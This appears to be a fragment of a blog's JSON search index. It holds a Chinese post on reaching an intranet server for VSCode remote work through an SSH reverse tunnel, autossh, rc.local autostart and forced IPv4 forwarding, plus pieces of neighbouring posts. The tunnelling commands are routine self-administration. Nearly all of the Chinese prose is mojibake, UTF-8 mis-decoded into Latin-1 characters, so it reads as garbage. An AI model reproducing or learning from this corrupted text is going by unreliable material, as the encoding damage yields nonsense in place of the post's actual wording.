æµªå¤Ÿäº†ï¼Œç»§ç»­å‡†å¤‡è€ƒè¯•ã€‚ï¼ˆçœŸéš¾é¡¶â€¦â€¦ æœŸæœ«å†²å†²å†²ï¼ è¯´ä¸å®šè¿™æ˜¯ä»Šå¹´æœ€åä¸€ç¯‡blogäº†å–µã€‚ æºœäº†æºœäº†ã€‚","path":"2019/12/29/Tech_NUAAiCalWeb_deploy/"},{"title":"å°æƒ³æ³• | åŸºäºVSCodeå’Œsshå®ç°è¿œç¨‹ç¼–ç¨‹/ç‚¼ä¸¹","text":"Causeåœ¨å†…ç½‘æœ‰ä¸€å°æœåŠ¡å™¨ï¼Œèƒ½è¿æ¥å¤–ç½‘ä½†ç”±äºæ²¡æœ‰å…¬ç½‘ IP è€Œæ— æ³•åœ¨å¤–ç½‘ç›´æ¥è®¿é—®ï¼Œä¹‹å‰æƒ³è¦åœ¨ä¸Šé¢è·‘ç¨‹åºçš„æ—¶å€™ï¼Œå°±å¾—é€šè¿‡è¿œç¨‹æ¡Œé¢è¿›è¡Œæ“ä½œã€‚è™½ç„¶ Teamviewer é€Ÿåº¦è¿˜å¯ä»¥ï¼Œä½†æ€»æ„Ÿè§‰æœ‰ç‚¹ä¸å¤ªçˆ½â€¦â€¦ å¾ˆä¹…ä»¥å‰ï¼ˆå¤§æ¦‚ä¸€ä¸¤ä¸ªæœˆå‰ï¼‰å°±åœ¨é€¼ä¹ä¸Šçœ‹åˆ°è¿‡ä¸€ç¯‡æ–‡ç« è¯´å¯ä»¥ ä½¿ç”¨vscodeè¿›è¡Œè¿œç¨‹ç‚¼ä¸¹ ï¼ˆåŸæ–‡è§ Reference #1 å™«ï¼æˆ‘æ¥å…´è¶£äº†ï¼Œè€Œä¸”å…¶å®æ—©å°±æƒ³è¯•è¯•äº†ï¼Œç„¶è€Œä¹‹å‰åœ¨å¿™åˆ«çš„æ²¡ç©ºæŠ˜è…¾ ï¼ˆå…¶å®ç°åœ¨ä¹Ÿæ²¡ç©ºï¼‰ï¼Œå°±æ˜¯å‰å‡ å¤©åœ¨é…æœåŠ¡å™¨ç¯å¢ƒçš„æ—¶å€™ ï¼ˆéº»çƒ¦åˆ°çˆ†ç‚¸ï¼Œæœ€è®¨åŒé…ç¯å¢ƒäº†ï¼‰ï¼Œä¸€æƒ³å¹²è„†å°±å†æŠ˜è…¾ä¸€ä¸‹ï¼Œå¼„å¥½è¿œç¨‹ç‚¼ä¸¹ï¼ˆç¼–ç¨‹ï¼‰å§ã€‚ äºæ˜¯ä¹å°±è¿™æ ·è¿Linuxå‘½ä»¤éƒ½ä¸çŸ¥é“å‡ ä¸ªçš„æ†¨æ†¨çæŠ˜è…¾äº†ä¸€ä¸¤å¤©çš„sshï¼Œç»ˆäºå®ç°äº†è¿œç¨‹ç‚¼ä¸¹ï¼Œè´¼æœ‰æˆå°±æ„Ÿå˜»å˜»å˜»ã€‚ å…¶ä¸­é‡åˆ°äº†ä¸€äº›å¥‡æ€ªçš„é—®é¢˜ï¼Œç®€å•è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿæ–¹ä¾¿æˆ‘å¿˜äº†å†å›æ¥çœ‹çœ‹å§ã€‚ æ—¶é—´æœ‰é™ï¼ŒVSCodeçš„éƒ¨åˆ†å°±å¤§æ¦‚æä¸€ä¸‹æ€è·¯ï¼Œé‡ç‚¹æ˜¯sshçš„éƒ¨åˆ†å§â€¦â€¦ Guidance for sshä¸å¦¨å‡è®¾å¦‚ä¸‹ï¼Œè®°æ¸…æ¥šäº†å™¢ï¼Œåé¢é¢‘ç¹ç”¨åˆ°çš„ã€‚ computer IP/address info å†…ç½‘æœåŠ¡å™¨A 172.x.x.x å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œä½†å¤–ç½‘ä¸èƒ½ç›´æ¥è®¿é—®A å…¬ç½‘æœåŠ¡å™¨B test.com å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œä¹Ÿå¯è¢«å¤–ç½‘è®¿é—® èƒ½å¤Ÿè”ç½‘çš„ä¸»æœºC - æƒ³è¦åœ¨Cä¸Šå¯¹Aè¿›è¡Œè®¿é—® å†…ç½‘æœåŠ¡å™¨Aä¸Šçš„è®¾ç½®Aè®¾ç½®åå‘ä»£ç†åˆ°Bçš„ port1 ç«¯å£ å·¥ä½œåŸç†ï¼š1ã€æœ¬åœ°ä¸»æœºå’Œè¿œç¨‹ä¸»æœºå»ºç«‹è¿æ¥ï¼›2ã€è¿œç¨‹ä¸»æœºä¸Šåˆ†é…äº†ä¸€ä¸ª socket ä¾¦å¬ port ç«¯å£ï¼›3ã€è¿œç¨‹ç«¯å£ä¸Šæœ‰äº†è¿æ¥, è¯¥è¿æ¥å°±ç»è¿‡å®‰å…¨é€šé“è½¬å‘æœ¬æœºçš„ç«¯å£ã€‚ å¤‡æ³¨ï¼šroot ç™»å½•è¿œç¨‹ä¸»æœºæ‰èƒ½è½¬å‘ç‰¹æƒç«¯å£ã€‚ ssh -fCNR &lt;port1&gt;:localhost:22 usr_b@test.com -p 22 -R port1:host:port2 å°†è¿œç¨‹æœºå™¨çš„ç«¯å£æ˜ å°„åˆ°æœ¬åœ°ã€‚port1æ˜¯å…¬ç½‘æœåŠ¡å™¨Bçš„ç«¯å£ï¼Œhostä¸ºæœ¬åœ°Açš„IPï¼Œport2æ˜¯Aè¦æ˜ å°„åˆ°å…¬ç½‘çš„ç«¯å£ã€‚usr_b@test.com ç”¨æˆ·å@æœåŠ¡å™¨Båœ°å€ï¼Œè¡¨ç¤ºè¿æ¥åˆ°Bï¼Œä»¥ç”¨æˆ·usr_bç™»å½•ã€‚å½“ç„¶test.comä¹Ÿå¯ä»¥æ˜¯IPåœ°å€å•¦ã€‚-f SSHå®¢æˆ·ç«¯åœ¨åå°è¿è¡Œ-C å…è®¸å‹ç¼©-g å…è®¸è¿œç¨‹ä¸»æœºå¯è¿œç¨‹è®¿é—®ï¼Œè¿™é‡Œæœ‰å‘ã€‚ ï¼ˆä½†autosshæ²¡æœ‰è¿™ä¸ªé€‰é¡¹æ‰€ä»¥åº”è¯¥å½±å“ä¸å¤§ï¼‰-N Do not execute a shell or command. ä¸æ‰§è¡Œè„šæœ¬æˆ–å‘½ä»¤ï¼Œé€šå¸¸ä¸-fè¿ç”¨ã€‚-p 22 è¡¨ç¤ºæŒ‡å®šè¿æ¥åˆ°Bçš„22ç«¯å£ï¼Œé»˜è®¤å°±æ˜¯22å•¦ï¼Œå¦‚æœä¸æ˜¯çš„è¯è®¾ç½®æˆBçš„sshç«¯å£ã€‚ æ³¨æ„ä¸€ä¸‹ï¼Œï¼ˆç½‘ä¸Šè¯´ï¼‰ è¿™é‡Œæœ‰ä¸ªå‘ï¼Œ-gè¿˜éœ€è¦åœ¨å…¬ç½‘æœåŠ¡å™¨Båšä¸‹é¢çš„è®¾ç½®ï¼Œè®¾ç½®å®Œåå†é‡å¯æœåŠ¡ã€‚ vim /etc/ssh/sshd_config # æ–°å¢ GatewayPorts yes è¿›é˜¶1 autosshç”±äºsshä¼šè‡ªåŠ¨æ–­å¼€è¿æ¥ï¼Œäºæ˜¯åˆ©ç”¨è‡ªåŠ¨é‡è¿å·¥å…·autosshï¼Œä¿è¯è¿æ¥ç¨³å®šã€‚ é¦–å…ˆå®‰è£…autosshï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯CentOSç³»ç»Ÿã€‚å…¶ä»–ç±»ä¼¼çš„ã€‚ sudo yum -y install autossh å…¶å®æˆ‘å‘ç°yumï¼ˆçš„æºé‡Œï¼‰æ‰¾ä¸åˆ°autosshï¼Œåæ¥æ˜¯ç”¨wgetä¸‹è½½ç„¶åæ‰‹åŠ¨å®‰è£…çš„â€¦ screen -S reverse_proxy autossh -M &lt;port2&gt; -CNR &lt;port1&gt;:localhost:22 usr_b@test.com å¤šäº†ä¸ª-Må‚æ•°ï¼Œè¡¨ç¤ºä»Bçš„port2æ£€æµ‹æ˜¯å¦æ–­çº¿ã€‚åŒæ—¶autosshä¼šåœ¨åå°è¿è¡Œï¼Œ-fä¹Ÿä¸éœ€è¦äº†ã€‚ è¿™é‡Œçš„screenç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢ï¼Œç»™è¿™ä¸ªç•Œé¢èµ·äº†ä¸ªåå«reverse_proxyï¼Œå½“ç„¶æ²¡æœ‰è£…screençš„è¯ä¹Ÿéœ€è¦è£…ä¸€ä¸‹ï¼Œä¸è¿‡ä¸æ‰§è¡Œscreenè¿™æ¡è¯­å¥ç†è®ºä¸Šä¹Ÿèƒ½ç”¨ã€‚ æ³¨æ„ï¼Œport1å’Œport2å‡éœ€è¦åœ¨Bçš„å®‰å…¨ç»„å†…è®¾å¥½è§„åˆ™ï¼Œå…è®¸å¤–ç½‘è®¿é—®ã€‚ è€Œåçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è¿è¡Œâ†“ å¯è§Aå·²å’ŒBå»ºç«‹è¿æ¥ã€‚æ­¤å¤„port1ä¸º9999ï¼Œport2ä¸º9998ï¼Œä»…ç”¨äºæ¼”ç¤ºï¼Œä½ å®Œå…¨å¯ä»¥çœ‹å¿ƒæƒ…é€‰æ‹©ä½ å–œæ¬¢çš„ç«¯å£ï¼Œå½“ç„¶æœ‰çš„ç«¯å£æœ‰ç‰¹å®šåŠŸèƒ½å¦å¤–è¯´ã€‚ è¿›é˜¶2 å¼€æœºè‡ªå¯å½“ç„¶ï¼Œä¸ºäº†è¿æ¥å†å¯é ä¸€ç‚¹ï¼Œç¡®ä¿Aé‡å¯åè¿˜å¯ä»¥è¿ä¸Šï¼Œå¯ä»¥åœ¨Aä¸Šå†è®¾ç½®ä¸€ä¸‹å¼€æœºè‡ªåŠ¨å¯åŠ¨autosshã€‚ æœ‰ä¸€ç§æ–¹æ³•æ˜¯åœ¨/etc/rc.localé‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ su - user_a -c \"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2&gt; -CNR &lt;port1&gt;:localhost:22 usr_b@test.com\" å…¶ä¸­ï¼Œ-iåæ¥çš„æ˜¯SSH_KEY_FILE_PATHï¼Œå³ç§é’¥åœ°å€ï¼Œrootç”¨æˆ·é»˜è®¤ä¸º/root/.ssh/id_rsaã€‚user_aæ˜¯Aä¸Šçš„ç”¨æˆ·ï¼Œä¸”è¦æ±‚åœ¨å…¬ç½‘æœåŠ¡å™¨Bä¸Šï¼Œå·²ç»æœ‰äº†Aä¸»æœºä¸Šç”¨æˆ·user_açš„å…¬é’¥ ï¼ˆè¿™ä¸ªåœ¨ä¸‹é¢Bçš„è®¾ç½®ä¸­ä»‹ç»ï¼‰ã€‚ ç„¶åè®°å¾—ç»™è¿™ä¸ªæ–‡ä»¶èµ‹äºˆå¯æ‰§è¡Œæƒé™ã€‚ chmod +x /etc/rc.d/rc.local ä¸è¿‡çœ‹è¿™ä¸ªæ–‡ä»¶æ³¨é‡Šé‡Œçš„è¯´æ³•ï¼Œå¥½åƒè¿™ä¸ªæ–¹æ³•ä¸æ¨èäº†ã€‚ å½“ç„¶è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–çš„é…ç½®å¼€æœºè‡ªå¯çš„æ–¹æ³•ï¼Œæˆ‘ä¹ŸåˆšæŠ˜è…¾å¯¹Linuxä¹Ÿä¸ç†Ÿï¼Œåé¢å†çœ‹çœ‹å§ã€‚ ç°åœ¨ä½ å¯ä»¥rebootè¯•ä¸€ä¸‹äº†ï¼Œå‰ææ˜¯ä½ èƒ½ç¡®ä¿ç”¨è¿™å°æœåŠ¡å™¨çš„å…¶ä»–äººæ²¡æ„è§ï¼Œé‡è¦æ•°æ®è®°å¾—ä¿å­˜å¥½å™¢ã€‚ è¿™æ ·Aä¸Šçš„è®¾ç½®å°±å‘Šä¸€æ®µè½äº†ï¼Œä¸‹é¢çœ‹å…¬ç½‘æœåŠ¡å™¨Bã€‚ å…¬ç½‘æœåŠ¡å™¨Bä¸Šçš„è®¾ç½®å¦‚æœåªéœ€è¦åœ¨Bä¸Šå¯¹Aè¿›è¡Œè¿œç¨‹ç‚¼ä¸¹ï¼Œé‚£å°±ä¸éœ€è¦åœ¨Bä¸Šè®¾ç½®å•¥äº†ï¼Œç°åœ¨ç›´æ¥sshå°±å®Œäº‹äº†ã€‚ ssh -p &lt;port1&gt; localhost å› ä¸ºå·²ç»æŠŠAçš„sshå¯¹åº”çš„22ç«¯å£æ˜ å°„åˆ°Bçš„port1ç«¯å£äº†å‘€ï¼ è¯•ä¸€ä¸‹æœç„¶å¦‚æ­¤ã€‚ è¿›é˜¶ å…å¯†ç™»å½•è¿™æ ·æ¯æ¬¡ç™»å½•éƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œæ˜¯æœ‰ç‚¹éº»çƒ¦äº†ã€‚ è¿™æœ‰ä¸ªåŠæ³•ï¼Œå°±æ˜¯æŠŠæœ¬æœºçš„sshå…¬é’¥å¤åˆ¶åˆ°è¦ç™»å½•çš„æœåŠ¡å™¨Açš„~/.ssh/authorized_keyæ–‡ä»¶ä¸­ï¼Œå®ç°å…å¯†ç™»å½•ã€‚ ä»€ä¹ˆï¼Œä½ è¿˜è§‰å¾—å¤ªéº»çƒ¦äº†ï¼Ÿï¼Ÿï¼Ÿ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¿«åŠæ³•ï¼Œå°±æ˜¯åœ¨Bä¸Šç™»å½•Aåæ‰§è¡Œè¿™ä¸ªâ€”â€” ssh-copy-id -i .ssh/id_rsa.pub usr_a@172.x.x.x -i æŒ‡å‘æœ¬åœ°çš„å…¬é’¥æ–‡ä»¶ï¼Œä¸€èˆ¬åœ¨ç”¨æˆ·çš„ç›®å½•ä¸‹ã€‚usr_a ä¸ºAä¸Šè¦ç™»å½•çš„ç”¨æˆ·å ç„¶åå°±å¯ä»¥ä»Bå…å¯†ç™»å½•å†…ç½‘æœåŠ¡å™¨Aå•¦ã€‚ä½ ç°åœ¨å¯ä»¥åœ¨Bä¸Šsshè¯•ä¸€ä¸‹ï¼Œç†è®ºä¸Šç›´æ¥å°±å·²ç»ç™»å½•å¥½äº†å‘¢ï¼ åœ¨ä»»æ„ä¸€å°è”ç½‘ä¸»æœºCå¯¹Aè¿›è¡Œè®¿é—®çš„å®ç°åˆ°è¿™é‡Œæˆ‘æœ‰ç‚¹æˆå°±æ„Ÿäº†ï¼Œè¿œç¨‹ç‚¼ä¸¹å®é™…ä¸Šå·²ç»å®ç°äº†ã€‚ ç„¶è€Œæˆ‘çš„åˆè¡·æ˜¯è¦åœ¨ä¸€å°èƒ½è”ç½‘çš„ä¸»æœºCä¸Šå»è¿æ¥å†…ç½‘Açš„å‘€ï¼Œä¸è¡Œè¿˜å¾—å†æŠ˜è…¾ä¸€ä¸‹å•Šå‘œã€‚ é¦–å…ˆè¯•äº†ä¸€ä¸‹ç›´æ¥è¿æ¥å…¬ç½‘æœåŠ¡å™¨Bçš„port1ï¼Œç„¶è€Œä¸å¯è¡Œã€‚ ä¸è¿‡ç½‘ä¸Šæœ‰äº›èµ„æ–™è¯´æ˜¯å¯è¡Œçš„ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿä¸çŸ¥é“å‘¢ï¼Œå¯èƒ½è¦é—®ç¥å¥‡çš„æµ·èºå§ã€‚ æ ¹æ®ç½‘ä¸Šçš„è¯´æ³•ï¼Œå·²ç»åœ¨Bä¸Šå¯¹GatewayPortsè¿›è¡Œäº†è®¾ç½®ï¼Œä¹Ÿæ€æ­»è¿›ç¨‹é‡å¯äº†æœåŠ¡ç”šè‡³ç›´æ¥rebootäº†ï¼Œç„¶è€Œä¸çŸ¥é“ä¸ºå•¥ä¸å¯è¡Œâ€¦â€¦ ä¸è¿‡ä¹Ÿä¸æ˜¯æ²¡æœ‰åŠæ³•å‘¢ï¼Œsshé‡Œè¿˜æœ‰ä¸ªæ­£å‘ä»£ç†é—²ç€æ²¡äº‹å¹²å‘¢ï¼Œè¯´ä¸Šå°±ä¸Šå§ã€‚ åœ¨Bä¸Šç»§ç»­è¿›è¡Œå¦‚ä¸‹é…ç½® ssh -fCNL *:&lt;port3&gt;:localhost:&lt;port1&gt; localhost è¡¨ç¤ºå°†Bä¸Šçš„port1æ˜ å°„åˆ°port3ï¼Œæ³¨æ„port3ä¹Ÿè¦è®¾ç½®å®‰å…¨ç»„è§„åˆ™å•Šã€‚ ç”¨ss -ant çœ‹äº†ä¸€ä¸‹ï¼Œport3çš„ç¡®æ‰“å¼€äº†ã€‚ ç†è®ºä¸Šè¿™æ ·çš„è¯åœ¨Cä¸Šsshè¿æ¥Bçš„port3ç«¯å£ï¼Œå°±å¯ä»¥ç›´æ¥è®¿é—®åˆ°å†…ç½‘Aäº†çš„ã€‚ å¦‚æœä½ æˆåŠŸäº†ï¼Œé‚£å°±å¯ä»¥ç›´æ¥è·³åˆ°é…ç½®VSCodeçš„éƒ¨åˆ†äº†ï¼Œå°½æƒ…äº«å—è¿œç¨‹ç‚¼ä¸¹çš„å¿«æ„Ÿå§ï¼ å–œæ¬¢çš„è¯å¯ä»¥æ»‘åˆ°é¡µé¢ä¸‹æ–¹ï¼Œèµèµä¸€ä¸‹ç»™æˆ‘ä¹°ç‚¹å¥½åƒçš„ï¼ˆæˆ‘é¥¿äº†.jpg ç„¶è€Œæˆ‘å¹¶æ²¡æœ‰æˆåŠŸâ€¦â€¦ çœ‹äº†ä¸€ä¸‹å®‰å…¨ç»„è®¾ç½®ï¼Œæ²¡é—®é¢˜ï¼Œå”‰ï¼Œå¤§ä¸äº†å…¨å¼€äº†å˜›ã€‚è¿˜æ˜¯ä¸è¡Œã€‚ è¿™é‡Œæˆ‘éš¾å—æ­»äº†ï¼Œæ€æ­»è¿›ç¨‹åˆé‡æ¥è¯•äº†å¥½å‡ æ¬¡ï¼Œä¸€æ ·æ²¡æœ‰æ•ˆæœã€‚ å†å»ç½‘ä¸ŠæŸ¥äº†æŸ¥ï¼Œç›´åˆ°çœ‹åˆ°ä¸€ç¯‡æ–‡ç« é‡Œæåˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œä½†ä»–ç›´æ¥ç”¨çš„sshè€Œæ²¡æœ‰ç”¨åˆ°autosshï¼Œç”¨ä»–çš„æ–¹æ¡ˆè¿˜æ˜¯æ²¡è§£å†³é—®é¢˜ã€‚ä¸è¿‡é‡Œé¢æåˆ°äº†ä¸€ä¸ªå‘½ä»¤å«lsofï¼Œå³â€œåˆ—å‡ºæ‰“å¼€æ–‡ä»¶(lists openfiles)â€ï¼Œè€Œåœ¨Unixä¸­ä¸€åˆ‡ï¼ˆåŒ…æ‹¬ç½‘ç»œå¥—æ¥å£ï¼‰éƒ½æ˜¯æ–‡ä»¶ã€‚è¿™å¯æ˜¯ä¸ªç¥å™¨å•Šï¼ è¿™é‡Œç”¨åˆ°çš„æ˜¯ ä½¿ç”¨-i :portæ¥æ˜¾ç¤ºä¸æŒ‡å®šç«¯å£ç›¸å…³çš„ç½‘ç»œä¿¡æ¯ã€‚ lsof -i :&lt;port3&gt; # æŸ¥çœ‹è¿æ¥port3ç«¯å£çš„ç½‘ç»œä¿¡æ¯ ç»“æœç±»ä¼¼äºè¿™æ ·ï¼ˆå¿˜è®°æˆªå›¾äº†ï¼‰ï¼Œæ­¤å¤„port3ä¸ºä»…ä¾›æ¼”ç¤ºæ‰€ç”¨çš„9988ã€‚ # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 658 root 4u IPv6 146251 0t0 TCP *:9988 (LISTEN) è¿™é‡Œæˆ‘æ‰å‘ç°ï¼Œå™«ï¼Œæ€ä¹ˆåªç›‘å¬äº†IPv6ï¼Œè€Œæ²¡æœ‰IPv4å•Šï¼ å®é™…ä¸Šé€šè¿‡ss -antä¹Ÿå¯ä»¥å‘ç°å¯¹åº”çš„ç«¯å£åªæœ‰tcp6è€Œæ²¡æœ‰tcpâ€¦ ç„¶è€Œé˜¿é‡Œäº‘å®ä¾‹ï¼ˆå®‰å…¨ç»„å†…ï¼‰åªæœ‰IPv4å‡ºå£æ¥ç€ï¼Œè€Œä¸”ä¹Ÿæ˜¯é€šè¿‡IPv4è¿æ¥åˆ°Bçš„ï¼Œæ€ªä¸å¾—è¿ä¸ä¸Šå‘¢ã€‚ï¼ˆä½›äº† ä¸è¿‡ä¹Ÿå¥‡æ€ªäº†ï¼Œç†è®ºä¸Šsshåº”è¯¥v4å’Œv6éƒ½ç›‘å¬çš„å§ã€‚ å»æŸ¥äº†ä¸€ä¸‹sshå‘½ä»¤ï¼Œè¿™æ¬¡å¼ºåˆ¶ä½¿ç”¨ IPv4è¯•è¯•ã€‚ ï¼ˆåœ¨Bä¸Šæ€æ­»ä¹‹å‰çš„sshï¼Œå†æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚è®°å¾—æ”¹æˆä½ çš„ç«¯å£å“ˆã€‚ ssh -fCNL *:&lt;port3&gt;:localhost:&lt;port1&gt; localhost -4 -4è¡¨ç¤ºå¼ºåˆ¶ä½¿ç”¨IPv4 è¿™å›å†çœ‹lsof -i :&lt;port3&gt;ï¼š # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 954 root 4u IPv4 255331 0t0 TCP *:9988 (LISTEN) ç„¶åå†åœ¨Cä¸Šè¿æ¥Bçš„port3ç«¯å£ã€‚ å“‡å“‡å“‡æˆåŠŸäº†ï¼ çœ‹æ¥æœç„¶æ˜¯è¿™ä¸ªé—®é¢˜å•Šæˆ‘å“­äº†åˆç¬‘äº†ã€‚ ä¸‹é¢å°±å¯ä»¥è®¾ç½®VSCodeæ¥å®ç°è¿œç¨‹ç‚¼ä¸¹å•¦ï¼ Guidance for VSCodeå…·ä½“å¯ä»¥å‚è€ƒReference #1ï¼Œè¿™é‡Œç®€å•æ“ä½œä¸€ä¸‹ã€‚ åœ¨VSCodeå®‰è£…**Remote Developmentå¼€å‘åŒ…ï¼ˆæ‰©å±•ï¼‰**ï¼Œç„¶ååœ¨è¿œç¨‹èµ„æºç®¡ç†å™¨é‡Œæ–°å¢ä¸€ä¸ªSSH Targetã€‚ åœ¨ç”¨æˆ·çš„.ssh/configæ–‡ä»¶å†…æ–°å¢ä½ çš„å†…ç½‘ç‚¼ä¸¹ç‚‰ä¿¡æ¯ã€‚ Host ç»™ä½ çš„å†…ç½‘ä¸»æœºèµ·ä¸ªåï¼ˆçœ‹ä½ å¿ƒæƒ…éšæ„å–ï¼‰HostName å…¬ç½‘æœåŠ¡å™¨Bçš„IPæˆ–åŸŸåPort å¡«port3ï¼Œå¦‚æœport1èƒ½è¿ä¸Šå°±å¡«port1User å¡«å†…ç½‘æœåŠ¡å™¨Açš„ç™»å½•ç”¨æˆ·å ä¿å­˜ï¼Œç„¶åä¾¿å¯ä»¥è¿æ¥è¯•ä¸€è¯•äº†ã€‚ è¿æ¥åè¾“å…¥Aå¯¹åº”ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åå°±è¿ä¸Šäº†ã€‚æ‰“å¼€æ–‡ä»¶å¤¹è¿˜éœ€è¦å†è¾“ä¸€æ¬¡å¯†ç ã€‚ ç°åœ¨å†ç”¨å‰é¢åœ¨Bçš„é…ç½®é‡Œè¯´çš„åŠæ³•ï¼ŒæŠŠCä¸»æœºçš„å…¬é’¥æ”¾åˆ°Aé‡Œå°±å¯ä»¥å®ç°å…å¯†ç™»å½•å•¦ï¼ å‘ï¼Œè¿™å°±æ˜¯åœ¨Cä¸Šè¿æ¥åˆ°å†…ç½‘ç‚¼ä¸¹ç‚‰çš„æ•ˆæœäº†â†“ã€‚ ç½‘ç»œå»¶æ—¶å‡ ä¹æ²¡æœ‰ï¼ˆä¸è¿‡ä¹Ÿå–å†³äºç½‘ç»œç¯å¢ƒï¼‰ï¼Œå’Œåœ¨æœ¬åœ°ç¼–ç¨‹å‡ ä¹æ²¡æœ‰å·®åˆ«ï¼Œçˆ½åˆ°çˆ†ç‚¸ï¼ å“‡å“‡å“‡æˆå°±æ„Ÿçˆ†æ£šå•Šå“‡å“‡å“‡ï¼ï¼ï¼ Summaryæ—¶é—´å› ç´ ï¼Œä¸å¯é¿å…å¯èƒ½å­˜åœ¨ä¸€äº›å¤±è¯¯ä¹‹å¤„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸å°‘å¯ä»¥æ‹“å±•ä¹‹å¤„ï¼Œæ¬¢è¿äº¤æµæå‡ºå“ˆã€‚ æœ¬æ–‡ä»…ç”¨äºå­¦ä¹ ç ”ç©¶ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼Œ æœªç»å…è®¸ä¸å¾—å•†ç”¨ï¼Œè½¬è½½è¯·ç½²åMiaoTonyå¹¶ä¿ç•™æœ¬æ–‡é“¾æ¥ï¼Œè°¢è°¢ã€‚ è¯´ç‚¹é¢˜å¤–è¯å§ã€‚ ä¸Šå‘¨æœ«åˆ°è¿™å‘¨éƒ¨ç½²NUAA_iCal_Webåœ¨çº¿ç‰ˆæœ¬å¼„äº†ä¸€å‘¨æœ«ï¼ˆå¥½èœå•Šç¬¬ä¸€æ¬¡å¼„éƒ¨ç½²æ¥ç€â€¦ï¼‰ï¼Œé…æœåŠ¡å™¨ç¯å¢ƒæŠ˜è…¾äº†è€åŠå¤©ï¼ˆç”šè‡³åªè£…å¥½äº†GPUé©±åŠ¨å’Œanacondaè¿˜æ²¡é…CUDAï¼‰ï¼Œé…è¿œç¨‹ç‚¼ä¸¹åˆçæŠ˜è…¾äº†ä¸€ä¸¤å¤©ï¼Œå†™è¿™ç¯‡æ–‡ç« åˆæ–­æ–­ç»­ç»­åœ°èŠ±äº†å¥½å‡ ä¸ªå°æ—¶ã€‚ å‘œä¸‹å‘¨å¼€å§‹é¢‘ç¹è€ƒè¯•äº†ï¼Œä¸æ•¢çæŠ˜è…¾äº†å˜¤å˜¤å˜¤ã€‚ï¼ˆæºœäº†æºœäº† Reference ä½¿ç”¨vscodeè¿›è¡Œè¿œç¨‹ç‚¼ä¸¹ SSHåå‘è¿æ¥ä½¿ç”¨Autosshè‡ªåŠ¨ssh åˆ©ç”¨é˜¿é‡Œäº‘ECSè·³æ¿æœºå†…ç½‘ç©¿é€- ssh SSHå¦‚ä½•åå‘ä»£ç†ç¨³å®šç©¿é€å†…ç½‘ å†…ç½‘ç©¿é€ï¼šåœ¨å…¬ç½‘è®¿é—®ä½ å®¶çš„ NAS ï¼ˆè¿˜åŒ…æ‹¬frpç›¸å…³ï¼‰ ä»å¤–ç½‘ SSH è¿›å±€åŸŸç½‘ï¼Œåå‘ä»£ç†+æ­£å‘ä»£ç† autossh ç©¿é€ï¼Œåå‘ä»£ç†åˆ°å†…ç½‘ ssh-copy-idä¸‰æ­¥å®ç°SSHæ— å¯†ç ç™»å½•å’Œsshå¸¸ç”¨å‘½ä»¤ Linux å‘½ä»¤ç¥å™¨ï¼šlsof ä½¿ç”¨ autossh è‡ªåŠ¨é‡å¯ SSH ä¼šè¯å’Œé€šé“ CentOS7æ·»åŠ å¼€æœºå¯åŠ¨æœåŠ¡æˆ–è„šæœ¬ etc. éå¸¸æ„Ÿè°¢ä¸Šé¢è¿™äº›æ–‡ç« ï¼Œç»™äº†æˆ‘å¾ˆå¤šå¯å‘å‘¢ã€‚","path":"2019/12/21/Idea_RemoteProgramming/"},{"title":"å°æƒ³æ³• | QQå°ç¨‹åºã€å¹´ç»ˆæŠ¥å‘Šå•/2019å¹´ç»ˆæ€»ç»“ã€‘åˆ†æ","text":"ç¼˜ç”±è¿™ä¸¤å¤©çœ‹ç©ºé—´å„ç§å‘ã€æˆ‘çš„2019å¹´ç»ˆæŠ¥å‘Šã€‘ï¼Œç„¶åæˆ‘ä¹Ÿå»æµ‹äº†ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°å•¥ä¹Ÿä¸ç”¨å¡«ï¼Œç”³è¯·è·å–ä¸ªäººä¿¡æ¯çš„æƒé™ï¼ŒæŠ¥å‘Šå°±å‡ºæ¥äº†ã€‚ ç„¶è€Œå¼¹å‡ºä¸€ä¸ªé®ç½©å±‚è®©ä½ å…ˆçœ‹ä¸ª15sçš„å¹¿å‘Šâ€¦â€¦ è¶…æƒ³åæ§½ï¼ŒåŒ…æ‹¬é¡µé¢ä¸‹é¢çš„å¹¿å‘Šã€‚ã€‚ ç„¶åçœ‹å®Œå¹¿å‘Šï¼Œç»ˆäºå‡ºæ¥äº†ã€‚ æ­£å½“æˆ‘æˆªäº†å›¾è¿”å›ä¹‹åï¼Œå™«æ¢ä¸ªæ€§åˆ«è¯•è¯•ã€‚ å¥½ï¼Œè¿™å›ä¸ä¸€æ ·äº†å‘€ï¼ ç„¶åå†æ¥ä¸€æ¬¡ï¼Œå™«ï¼Œåˆä¸ä¸€æ ·äº†â€¦â€¦è¿™è®©æˆ‘æ€€ç–‘ä»–å°±æ˜¯å‡çš„å‡ å¼ å›¾ç‰‡è€Œå·²å§ã€‚ æˆ‘å…´è¶£æ¥äº†ï¼Œä¸å¦‚æ¥æŠ˜è…¾ä¸€ä¸‹ï¼Œåˆ†æä¸€ä¸‹è¿™ä¸ªå°ç¨‹åºå§ã€‚ ï¼ˆä¸æŠ˜è…¾ä¼šæ­»â€¦â€¦ å¼€å§‹æŠ˜è…¾ 1å…ˆæ¥çœ‹ä¸€çœ‹è¿™ä¸ªå°ç¨‹åºçš„è®¾ç½®ï¼Œå‘ç°åªè·å–äº†ç”¨æˆ·ä¿¡æ¯ã€‚çœ‹ä¸€çœ¼æ›´å¤šèµ„æ–™â€”â€” 